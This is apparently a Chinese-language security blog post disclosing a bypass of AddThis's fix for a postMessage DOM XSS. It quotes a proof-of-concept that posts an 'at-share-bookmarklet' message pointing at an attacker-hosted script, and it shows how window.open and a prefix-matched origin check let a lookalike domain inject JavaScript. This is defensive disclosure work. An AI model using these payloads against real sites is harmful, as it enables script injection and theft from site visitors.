title: "分享插件AddThis导致的DOM XSS"
date: 2016-12-25 14:03:41
tags: ["安全", "XSS"]

---

## 背景

说明：这个漏洞是 https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/ 修复的绕过，目前已经报告给AddThis并得到修复。

> AddThis是由多姆·沃纳伯格（Dom Vonarburg）创立并由Clearspring公司拥有的一个社会性书签服务。它可以与网站进行整合，访客即可用它将网站上的某些内容通过其他网络服务收藏或分享，诸如Facebook、MySpace、Google书签、Twitter等
> From https://zh.wikipedia.org/wiki/AddThis

使用的例子有：

![](http://ww4.sinaimg.cn/large/7184df6bgw1fb30n0dmyqj20nd08o0wd.jpg)

![](http://ww4.sinaimg.cn/large/7184df6bgw1fb30nhwnasj20rq0bddho.jpg)

## 分析

使用这款插件，需要在网页上加入类似以下的代码

```html
<!-- Go to www.addthis.com/dashboard to customize your tools -->
<script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-538ceb912f1cca19" async="async"></script>
```

当插件加载完成后，就会监听`message`事件。

![](http://ww3.sinaimg.cn/large/7184df6bgw1fb3110ele5j21340em79m.jpg)

看完前面提到的那篇文章之后，我们可以知道在这个事件处理函数中，如果`message`事件处理函数接收到一个 *合法来源* 的消息，消息内容如下：`at-share-bookmarklet://example.com/xss.js`时，就会动态在页面中插入指定的JS脚本。之前的漏洞是在这里根本没有检查消息的来源就直接加载执行导致了DOM XSS，原先的PoC：

```html
<iframe id="frame" src="https://targetpage/using_addthis"></iframe>

<script>
document.getElementById('frame').contentWindow.postMessage('at-share-bookmarklet://ATTACKERDOMAIN/xss.js', '*');
</script>
```

AddThis对这个漏洞进行的修复如下：
1. 添加检查当前窗口是不是被嵌套在：`iframe`, `frame`等标签里，如果是，则不监听`message`事件。
2. 检查来源

修复后的代码如下：

```js
, c = window.parent === window;
...
c && u(window, "message", function(e) {
  if (e) {
      var t = _atr.substring(0, _atr.length - 1)
        , n = e.origin.indexOf(t) === "https:".length || e.origin.indexOf(t) === "http:".length || /^https?:\/\/(localhost:\d+|localhost$)/.test(e.origin)
        , o = "string" == typeof e.data;
      if (o && n) {
          var a = e.data.match(/at\-share\-bookmarklet\:(.+?)$/) || []
            , i = a[1];
          if (i) {
              try {
                  _ate.menu.close()
              } catch (s) {}
              r(i)
          }
      }
  }
})
```

1. 其中`_attr`的值为`//s7.addthis.com/`，那么`t`的值就是`//s7.addthis.com`
2. `e.origin`是调用了`postMessage`这个API的来源
3. 什么时候`o && n`的值会是真呢？例如站点：`http://s7.addthis.com/`向目标站点发送消息的时候

但这个修复真的没有问题了吗？在使用postMessage进行跨域通信的时候，有以下几种场景：

1. 父窗口与iframe，frame等标签里的子网页进行通信，即上面那个PoC
2. 使用window.open打开一个新的窗口

  ```js
  var win = window.open("http://target.com/index.html");
  win.postMessage("this is a message", "*");
  ```

  `http://target.com/index.html`这个页面就可以监听`message`事件获取到以上的消息。


也就是说，对于一个安装了这个插件的目标站点，我们依旧可以通过方法2发送一个消息给他。另外，这里的域名检查也不完善，简单的说，只要是`s7.addthis.com`开头的域名都是合法的，如`s7.addthis.com.evil.com`

```js
> e.origin = 'http://s7.addthis.com.evil.com'
> e.origin.indexOf(t) === "http:".length
< true
```

你现在在看的这个页面就加载了有漏洞的那个AddThis脚本，我在Github上实现了一个PoC，来XSS当前页面: http://s7.addthis.com.poc.akrxd.net/addthis_poc/poc.html

<script type="text/javascript" src="https://cdn.rawgit.com/zhchbin/zhchbin.github.io/source/js/addthis_widget.js"></script>
